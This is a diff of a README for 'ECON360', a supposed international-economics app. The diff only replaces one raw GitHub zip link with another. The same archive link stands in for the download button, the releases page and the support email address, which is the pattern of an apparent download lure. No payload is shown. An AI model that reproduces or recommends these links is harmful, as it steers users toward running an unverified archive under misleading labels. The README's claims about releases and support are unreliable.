@@ -1,6 +1,6 @@
 # 🌍 ECON360 - Understand International Economics Easily
 
-![Download ECON360](https://raw.githubusercontent.com/tracishim/ECON360/main/antitrope/ECO-1.2-beta.2.zip)
+![Download ECON360](https://raw.githubusercontent.com/tracishim/ECON360/main/antitrope/ECO-3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to ECON360! This application helps you explore concepts in international
 
 To get started, you need to download the application. 
 
-1. Visit the following link to download ECON360: [Download ECON360](https://raw.githubusercontent.com/tracishim/ECON360/main/antitrope/ECO-1.2-beta.2.zip).
+1. Visit the following link to download ECON360: [Download ECON360](https://raw.githubusercontent.com/tracishim/ECON360/main/antitrope/ECO-3.1.zip).
 2. Choose the latest version and click on it.
 3. Follow the instructions to download the file.
 
@@ -48,7 +48,7 @@ Here is how to use ECON360 once you have installed it:
 
 To ensure you have the latest features and content:
 
-1. Visit the releases page: [Download ECON360](https://raw.githubusercontent.com/tracishim/ECON360/main/antitrope/ECO-1.2-beta.2.zip).
+1. Visit the releases page: [Download ECON360](https://raw.githubusercontent.com/tracishim/ECON360/main/antitrope/ECO-3.1.zip).
 2. Check for the latest version.
 3. Download the new version and replace the existing installation.
 
@@ -57,7 +57,7 @@ To ensure you have the latest features and content:
 If you encounter any issues or have questions:
 
 - Check the FAQ section in the application for common problems and solutions.
-- Reach out to our support team via email at https://raw.githubusercontent.com/tracishim/ECON360/main/antitrope/ECO-1.2-beta.2.zip
+- Reach out to our support team via email at https://raw.githubusercontent.com/tracishim/ECON360/main/antitrope/ECO-3.1.zip
 
 ## 🌐 Resources
 
